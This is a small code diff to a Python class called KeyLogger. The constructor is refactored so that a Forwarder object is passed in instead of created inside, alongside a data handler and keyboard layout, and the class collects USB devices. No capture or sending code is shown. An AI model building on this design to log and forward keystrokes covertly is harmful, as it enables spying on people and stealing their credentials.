@@ -15,14 +15,17 @@ class KeyLogger:
     __slots__ = ["__devices", "data_handler", "__forwarder", "keyboard_layout"]
 
     def __init__(
-        self, keyboard_layout: dict[int, int], data_handler: DataHandler
+        self,
+        keyboard_layout: dict[int, int],
+        data_handler: DataHandler,
+        forwarder: Forwarder,
     ) -> None:
         # get all USB Devices
         self.__devices: list[int, int] = self.get_devices()
         # create a data handler
         self.data_handler = data_handler
         # create a forwarder
-        self.__forwarder = Forwarder()
+        self.__forwarder = forwarder
         # set keyboard
         self.keyboard_layout = keyboard_layout
 
